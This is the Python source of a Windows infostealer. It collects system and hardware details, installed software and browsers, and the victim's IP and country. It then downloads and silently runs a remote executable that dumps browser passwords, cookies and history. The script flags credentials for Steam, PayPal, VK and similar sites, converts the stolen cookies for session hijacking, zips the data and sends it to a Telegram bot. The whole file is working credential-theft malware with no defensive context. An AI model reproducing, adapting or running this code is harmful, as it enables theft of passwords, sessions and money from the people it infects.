from requests import get
from os import getcwd, getlogin, getenv, listdir, mkdir, remove
from shutil import move, make_archive
from locale import windows_locale
from telebot import TeleBot
from os.path import isfile, isdir
from subprocess import check_output
from win32api import GetSystemMetrics, ShellExecute
from platform import system, release
from wget import download
from winreg import ConnectRegistry, HKEY_CURRENT_USER, OpenKey, EnumKey, QueryValueEx, QueryInfoKey, HKEY_LOCAL_MACHINE
from datetime import datetime
from time import *
from wmi import WMI

import ctypes

computer = WMI()
os_info = computer.Win32_OperatingSystem()[0]
appdata = getenv('APPDATA')
dirty_domains = ['steamcommunity.com', 'vk.com', 'ubisoft.com', 'paypal.com', 'funpay.com']

bot = TeleBot('token')
chat_id = id

wave = '''                                                                                                                   
8b      db      d8  ,adPPYYba,  8b       d8   ,adPPYba,  ,adPPYba,  
`8b    d88b    d8'  ""     `Y8  `8b     d8'  a8P_____88  I8[    ""  
 `8b  d8'`8b  d8'   ,adPPPPP88   `8b   d8'   8PP"""""""   `"Y8ba,   
  `8bd8'  `8bd8'    88,    ,88    `8b,d8'    "8b,   ,aa  aa    ]8I  
    YP      YP      `"8bbdP"Y8      "8"       `"Ybbd8"'  `"YbbdP"'                                                                   
'''


def get_installed_programs():
    installed_programs = []
    with ConnectRegistry(None, HKEY_CURRENT_USER) as hkey:
        with OpenKey(hkey, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall") as key:
            i = 0
            while True:
                try:
                    subkey_name = EnumKey(key, i)
                    with OpenKey(key, subkey_name) as subkey:
                        display_name, _ = QueryValueEx(subkey, "DisplayName")
                        installed_programs.append(str(i+1) + ') ' + display_name)
                    i += 1
                except OSError:
                    break
    return installed_programs


def get_installed_browsers():
    browser_list = []
    with OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\\Clients\\StartMenuInternet") as key:
        for i in range(QueryInfoKey(key)[0]):
            subkey_name = EnumKey(key, i)
            with OpenKey(key, subkey_name) as subkey:
                try:
                    browser_name = QueryValueEx(subkey, None)[0]
                    browser_list.append(str(i+1) + ') ' + browser_name)
                except WindowsError:
                    pass
    return browser_list


def get_hwid():
	return str(check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()


def get_proc():
	return computer.Win32_Processor()[0].Name


def get_gpu():
	return computer.Win32_VideoController()[0].Name


def get_ram():
	return str(float(os_info.TotalVisibleMemorySize) / 1048576) + ' gb'


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def get_screenzie():
	return '{Width=' + str(GetSystemMetrics(0)) + ', Height='+ str(GetSystemMetrics(1)) + '}'


def get_os():
	return 'Windows ' + str(' '.join([os_info.Version, os_info.BuildNumber]))


def get_current_lang():
	windll = ctypes.windll.kernel32
	windll.GetUserDefaultUILanguage()

	return str(windows_locale[windll.GetUserDefaultUILanguage() ])


def get_ip():
	return get('https://api.ipify.org').text


def get_country_by_ip():
    return get(f"http://ipinfo.io/{get_ip()}/country").text.strip()


def userinfo():
	with open(appdata + '/Google/UserInformation.txt', 'w') as f:
		f.write(f'''{wave}
IP: {get_ip()}
FileLocation: "{getcwd()}"
UserName: {getlogin()}
Country: {get_country_by_ip()}
HWID: {get_hwid()}
Current Language: {get_current_lang()}
ScreenSize: {get_screenzie()}
Operation System: {get_os()}
Process Elevation: {is_admin()}
Log date: {datetime.now()}

Hardwares:
CPU: {get_proc()}
GPU: {get_gpu()}
RAM: {get_ram()}''')

def installedSoftware():
	with open(appdata + '/Google/InstalledSoftware.txt', 'w') as f:
		f.write(wave + '\n' + '\n'.join(get_installed_programs()))


def installedBrowsers():
	with open(appdata + '/Google/InstalledBrowsers.txt', 'w') as f:
		f.write(wave + '\n' + '\n'.join(get_installed_browsers()))


def stealer():
	download('https://raw.githubusercontent.com/cireqwen/waves-stealer/main/KEK.vmp.exe', out=appdata)
	ShellExecute(0, 'open', appdata + '/KEK.vmp.exe', '-dir ' + appdata + '/Google', None, 0)


def detected_domains():

	domains_p = []
	domains_c = []

	for f in listdir(appdata + '/Google/Passwords'):
		with open(appdata + '/Google/Passwords/' + f) as file:
			lines = file.readlines()
			for line in lines:
				try:
					domain = line.split(",")[2].split("//")[1].split("/")[0]  # извлекаем домен из URL
					if domain in dirty_domains:
						domains_p.append(domain)
				except IndexError:
					pass

	for f in listdir(appdata + '/Google/Cookies'):
		with open(appdata + '/Google/Cookies/' + f) as file:
			lines = file.readlines()
			for line in lines:
				try:
					domain = line.split(",")[0].lstrip(".")
					if domain in dirty_domains:
						domains_c.append(domain)
				except IndexError:
					pass
	

	with open(appdata + '/Google/DomainDetected.txt', 'w') as f:
		f.write(f'''PDD:
{', '.join(set(domains_p))}
CDD:
{', '.join(set(domains_c))}''')


def convert(file):
	f = open(file)
	Lines = f.readlines()
	for Line in Lines:
		if Lines.index(Line) == 0:
			continue
		Line = Line.split(',')
		host = Line[0]
		path = Line[1]
		key = Line[2]
		value = Line[3]
		secure = Line[4].upper()
		specified = Line[7].upper()
		expire = Line[9]
		try:
			dem = expire.split('T')
			day = dem[0].split('-')
			ttime = dem[1].split('+')[0].split(':')
			dt = datetime(int(day[0]), int(day[1]), int(day[2]), int(ttime[0]), int(ttime[1]), floor(float(ttime[2])))
			expire = str(round(mktime(dt.timetuple())))
		except Exception as ez:
			expire = round(time() + 14 * 24 * 3600)
			cookie = f'{host}\t{specified}\t{path}\t{secure}\t{expire}\t{key}\t{value}\n'
			with open(file + '.txt', 'a') as f:
				f.write(cookie)


def distribution():
	try:
		mkdir(appdata + '/Google/Passwords')
		mkdir(appdata + '/Google/Cookies')
		mkdir(appdata + '/Google/Other')
	except:
		pass

	for f in listdir(appdata + '/Google'):
		if 'password.csv' in f:
			move(appdata + '/Google/' + f, appdata + '/Google/Passwords/' + f)
		elif 'cookie.csv' in f:
			move(appdata + '/Google/' + f, appdata + '/Google/Cookies/' + f)
			convert(appdata + '/Google/Cookies/' + f)
		elif 'download.csv' in f or 'extension.csv' in f or 'history.csv' in f or 'localstorage.csv' in f or 'bookmark.csv' in f:
			move(appdata + '/Google/' + f, appdata + '/Google/Other/' + f)


def pack():
	make_archive(appdata + '/' + getlogin(), 'zip', appdata + '/Google/')

	with open(appdata + '/' + getlogin() + '.zip', 'rb') as f:
		bot.send_document(chat_id, f)

try:
	if not isdir(appdata + '/Google'):
		mkdir(appdata + '/Google')
	installedBrowsers()
	installedSoftware()
	stealer()
	userinfo()
	distribution()
	detected_domains()
	pack()
	
except Exception as f:
	#bot.send_message(chat_id, str(getlogin()) + ' - ' + str(f))
	print(f)
